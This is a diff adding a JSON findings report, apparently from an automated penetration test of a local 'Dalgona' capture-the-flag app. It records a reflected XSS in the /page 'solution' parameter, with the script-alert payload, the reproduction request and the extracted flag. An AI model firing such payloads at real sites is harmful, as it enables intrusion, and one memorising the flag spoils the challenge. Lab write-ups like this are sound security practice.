@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:39:50.992648+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a4b611e2-2e76-47ec-84c5-e11466577e56",
+      "timestamp": "2026-04-12T22:39:50.992530+00:00",
+      "title": "Reflected XSS in /page solution parameter \u2014 CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35983/page",
+      "description": "The /page endpoint accepts a POST parameter 'solution' that is reflected unsanitized into the HTML response. Submitting a <script>alert('XSS')</script> payload triggers the challenge and returns the CTF flag. The application uses Flask/Werkzeug and does not sanitize or encode user input before reflecting it in the page.",
+      "evidence": "POST /page with body solution=<script>alert('XSS')</script> returned HTTP 200 with body: Congratulations! Here is the flag: flag{b74b5516-3dc3-491e-8680-a01ab52b756c}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST http://172.17.0.1:35983/page  Content-Type: application/x-www-form-urlencoded  solution=<script>alert('XSS')</script>",
+        "expected": "HTTP 200 with flag{b74b5516-3dc3-491e-8680-a01ab52b756c} in response body"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "46a85e7e-61f8-4b8a-8413-dc685df66cb6",
+      "timestamp": "2026-04-12T22:40:02.794194+00:00",
+      "title": "Dalgona CTF Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Home[\"GET / - Dalgona Challenges Index\"]\n  Home --> PageLink[\"Link to /page\"]\n  Browser --> PageGET[\"GET /page - Solution Form\"]\n  Browser --> PagePOST[\"POST /page - Submit solution\"]\n  PagePOST --> XSSReflect[\"Reflected XSS: solution param unsanitized\"]\n  XSSReflect --> Flag[\"flag{b74b5516-3dc3-491e-8680-a01ab52b756c}\"]\n  Home --> Static[\"Static assets /static/\"]\n  Static --> CSS[\"CSS /static/css/xss/xss8.css\"]\n  Static --> Img[\"Images /static/img/\"]\n  PageGET --> Flask[\"Flask 3.1.8 / Werkzeug 3.1.8 / Python 3.11.15\"]"
+    }
+  ]
+}
